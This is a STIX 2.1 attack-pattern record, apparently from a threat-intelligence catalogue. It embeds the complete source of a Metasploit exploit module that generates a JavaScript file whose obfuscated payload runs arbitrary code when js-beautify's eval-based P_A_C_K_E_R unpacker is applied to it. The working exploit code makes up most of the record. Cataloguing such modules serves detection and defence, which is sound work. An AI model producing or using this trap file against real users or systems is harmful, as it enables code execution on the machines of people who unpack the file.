{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2c75e312-29a0-4fd2-95e4-82972ef4dc25",
    "created": "2024-08-14T17:05:06.63801Z",
    "modified": "2024-08-14T17:05:06.638014Z",
    "name": "Javascript Injection for Eval-based Unpackers",
    "description": " This module generates a Javascript file that executes arbitrary code when an eval-based unpacker is run on it. Works against js-beautify's P_A_C_K_E_R unpacker. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/js_unpacker_eval_injection.rb",
            "external_id": "js_unpacker_eval_injection.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::JSObfu\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Javascript Injection for Eval-based Unpackers',\n      'Description'    => %q{\n        This module generates a Javascript file that executes arbitrary code\n        when an eval-based unpacker is run on it. Works against js-beautify's\n        P_A_C_K_E_R unpacker.\n      },\n      'Author'         => [ 'joev' ],\n      'License'        => MSF_LICENSE,\n      'References'  =>\n        [\n        ],\n      'Platform'       => 'nodejs',\n      'Arch'           => ARCH_NODEJS,\n      'Privileged'     => false,\n      'Targets'        =>\t[['Automatic', {}]],\n      'DisclosureDate' => '2015-02-18',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      OptString.new('FILENAME', [true, 'The file name.', 'msf.js']),\n      OptString.new('CUSTOM_JS', [false, 'Custom Javascript payload.'])\n    ])\n  end\n\n  def exploit\n    p = js_obfuscate(datastore['CUSTOM_JS'] || payload.encoded);\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n    file_create(\"eval(function(p,a,c,k,e,r){}((function(){ #{p} })(),''.split('|'),0,{}))\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-18",
    "x_mitre_platforms": [
        "nodejs'"
    ]
}